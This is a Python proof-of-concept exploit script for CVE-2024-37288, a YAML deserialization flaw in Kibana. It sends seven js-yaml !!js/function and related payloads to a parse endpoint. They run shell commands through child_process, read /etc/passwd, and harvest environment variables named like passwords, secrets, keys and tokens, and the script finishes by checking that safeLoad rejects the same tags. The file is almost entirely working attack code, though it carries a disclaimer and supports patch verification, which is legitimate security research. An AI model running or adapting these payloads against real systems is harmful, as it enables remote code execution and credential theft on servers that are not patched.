#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CVE-2024-37288 — Kibana YAML Deserialization Multi-Payload (Network)
# Author         : Exploit Intelligence Platform
# Vendor         : Elastic
# Software       : Kibana 8.15.0
# CVE            : CVE-2024-37288
# CWE            : CWE-502 (Deserialization of Untrusted Data)
# CVSS           : 9.9 (CRITICAL)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2024-37288 — Vector 3: Multiple Payload Variants & !!js/ Type Enumeration (Network)

Tests multiple js-yaml v3 dangerous type tags over HTTP to demonstrate
the full scope of the insecure deserialization in Kibana's Integration
Assistant. Each payload is sent to /api/yaml/parse (vulnerable) and
/api/yaml/safe-parse (patched) to confirm both exploitation and fix.

PAYLOAD TYPES:
  1. !!js/function — OS command execution via child_process
  2. !!js/function — File read (data exfiltration)
  3. !!js/function — Network module availability check
  4. !!js/function — Environment variable leak
  5. !!js/function — toString override (implicit execution via coercion)
  6. !!js/regexp  — Regular expression creation (ReDoS potential)
  7. !!js/undefined — Undefined value creation (type confusion)

PREREQUISITES:
  - Network access to the vulnerable API (default port 8080)
  - No authentication required

REFERENCES:
  - CVE-2024-37288
  - https://discuss.elastic.co/t/kibana-8-15-1-security-update-esa-2024-27-esa-2024-28/366119

Usage:
    python3 poc_vector3.py <target_host> <target_port>
    python3 poc_vector3.py localhost 8080
"""

import sys
import json
import http.client
import textwrap


# Payloads to test — each is a (name, yaml_string, expected_status_keyword) tuple
PAYLOADS = [
    (
        '!!js/function — RCE via child_process',
        textwrap.dedent("""\
            target: !!js/function |
              function() {
                return require("child_process").execSync("id").toString().trim();
              }
        """),
        'function'
    ),
    (
        '!!js/function — File read /etc/passwd',
        textwrap.dedent("""\
            target: !!js/function |
              function() {
                return require("fs").readFileSync("/etc/passwd", "utf8").split("\\n").slice(0, 3).join("; ");
              }
        """),
        'function'
    ),
    (
        '!!js/function — Network+CP module availability',
        textwrap.dedent("""\
            target: !!js/function |
              function() {
                var net = require("net");
                var cp = require("child_process");
                return "net_available=" + (typeof net.Socket) + " cp_available=" + (typeof cp.execSync);
              }
        """),
        'function'
    ),
    (
        '!!js/function — Environment variable leak',
        textwrap.dedent("""\
            target: !!js/function |
              function() {
                var env = process.env;
                var interesting = {};
                for (var k in env) {
                  if (k.match(/pass|secret|key|token|elastic|node/i)) {
                    interesting[k] = String(env[k]).substring(0, 30) + "...";
                  }
                }
                return JSON.stringify(interesting);
              }
        """),
        'function'
    ),
    (
        '!!js/function — toString override (implicit RCE)',
        textwrap.dedent("""\
            obj:
              toString: !!js/function |
                function() {
                  return require("child_process").execSync("whoami").toString().trim();
                }
              valueOf: !!js/function |
                function() {
                  return 42;
                }
        """),
        'function'
    ),
    (
        '!!js/regexp — ReDoS-vulnerable regex',
        'pattern: !!js/regexp /^(a+)+$/gi',
        'regexp'
    ),
    (
        '!!js/undefined — Type confusion',
        'field: !!js/undefined ~',
        'undefined'
    ),
]

# YAML payloads for fix verification — safeLoad() should reject all
SAFE_CHECK_PAYLOADS = [
    ('!!js/function', 'x: !!js/function "function(){return 1}"'),
    ('!!js/regexp', 'x: !!js/regexp /test/gi'),
    ('!!js/undefined', 'x: !!js/undefined ~'),
]


def send_yaml(target_host, target_port, yaml_str, endpoint="/api/yaml/parse"):
    """Send a YAML string to the specified endpoint."""
    body = json.dumps({"yaml": yaml_str})
    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=10)
        conn.request("POST", endpoint, body=body,
                     headers={"Content-Type": "application/json"})
        response = conn.getresponse()
        status = response.status
        resp_body = response.read().decode('utf-8', errors='replace')
        conn.close()
        try:
            return status, json.loads(resp_body)
        except json.JSONDecodeError:
            return status, resp_body
    except Exception as e:
        return None, str(e)


def exploit(target_host, target_port):
    """Test all payload variants over HTTP."""
    print("=" * 70)
    print("  CVE-2024-37288 — Multiple Payload Variants & !!js/ Types")
    print("  Vector: HTTP POST to /api/yaml/parse × 7 payloads")
    print("=" * 70)
    print()

    # -----------------------------------------------------------------------
    # Step 1: Health check
    # -----------------------------------------------------------------------
    print(f"[*] Target: http://{target_host}:{target_port}")
    print("[*] Checking target health...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=5)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        health = json.loads(resp.read())
        conn.close()
        version = health.get("jsyaml_version", "unknown")
        print(f"[+] Target is UP — js-yaml v{version} with DEFAULT_FULL_SCHEMA")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Test all payloads
    # -----------------------------------------------------------------------
    print(f"\n[*] Testing {len(PAYLOADS)} payload variants...\n")

    success_count = 0

    for name, yaml_str, expected_type in PAYLOADS:
        print(f"-" * 70)
        print(f"[*] {name}")

        status, resp = send_yaml(target_host, target_port, yaml_str)

        if status is None:
            print(f"  [-] Request failed: {resp}")
            continue

        if isinstance(resp, dict) and resp.get("status") == "dangerous_types_deserialized":
            findings = resp.get("findings", [])
            for f in findings:
                ftype = f.get("type", "unknown")
                if ftype == "function":
                    if f.get("executed"):
                        output = f.get("output", "").strip()
                        if len(output) > 200:
                            output = output[:200] + "..."
                        print(f"  [+] RCE SUCCESS — output: {output}")
                    else:
                        print(f"  [*] Function created but exec error: {f.get('error')}")
                elif ftype == "regexp":
                    print(f"  [+] RegExp created: {f.get('pattern')}")
                elif ftype == "undefined":
                    print(f"  [+] undefined value created (type confusion)")
                else:
                    print(f"  [+] Dangerous type: {ftype}")
            success_count += 1
        elif isinstance(resp, dict) and resp.get("status") == "parsed":
            print(f"  [-] Parsed without dangerous types (unexpected)")
        elif isinstance(resp, dict) and resp.get("status") == "error":
            print(f"  [-] Error: {resp.get('error', 'unknown')[:100]}")
        else:
            print(f"  [-] HTTP {status}: {str(resp)[:100]}")

    # -----------------------------------------------------------------------
    # Step 3: Fix verification — safeLoad rejects all dangerous types
    # -----------------------------------------------------------------------
    print()
    print(f"-" * 70)
    print(f"[*] Fix verification — safeLoad() should reject all !!js/ types\n")

    fix_confirmed = 0

    for name, yaml_str in SAFE_CHECK_PAYLOADS:
        status, resp = send_yaml(target_host, target_port, yaml_str,
                                 endpoint="/api/yaml/safe-parse")

        if isinstance(resp, dict) and resp.get("status") == "rejected":
            print(f"  [+] safeLoad rejects {name}: CONFIRMED")
            fix_confirmed += 1
        elif isinstance(resp, dict) and resp.get("status") == "safe_parsed":
            print(f"  [-] safeLoad did NOT reject {name} — FIX BYPASS!")
        else:
            print(f"  [?] Unexpected for {name}: {resp}")

    # -----------------------------------------------------------------------
    # Summary
    # -----------------------------------------------------------------------
    print()
    print("=" * 70)
    print(f"Results: {success_count}/{len(PAYLOADS)} payload variants successful, "
          f"{fix_confirmed}/{len(SAFE_CHECK_PAYLOADS)} fix confirmations")

    if success_count > 0:
        print(f"[+] VULNERABILITY CONFIRMED: Multiple !!js/ type payloads succeed with load()")
        if fix_confirmed == len(SAFE_CHECK_PAYLOADS):
            print(f"[+] All dangerous types correctly rejected by safeLoad() (the fix)")
    print("=" * 70)

    return 0 if success_count > 0 else 1


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    sys.exit(exploit(target, port))
